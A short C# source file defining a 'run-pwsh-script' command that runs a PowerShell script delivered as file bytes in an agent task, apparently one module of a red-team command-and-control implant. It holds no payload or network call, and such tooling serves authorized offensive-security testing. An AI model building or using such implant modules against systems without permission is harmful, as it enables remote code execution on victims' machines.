using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;

namespace Agent.Commands
{
    public class RunPowershell : AgentCommand
    {
        public override string Name => "run-pwsh-script";

        public override string Execute(AgentTask task)
        {
            if (task.FileBytes is null)
            {
                return "No Powershell script provided.";
            } else
            {
                return Internal.Execute.ExecutePowershellScript(task.FileBytes);
            }
            
        }
    }
}
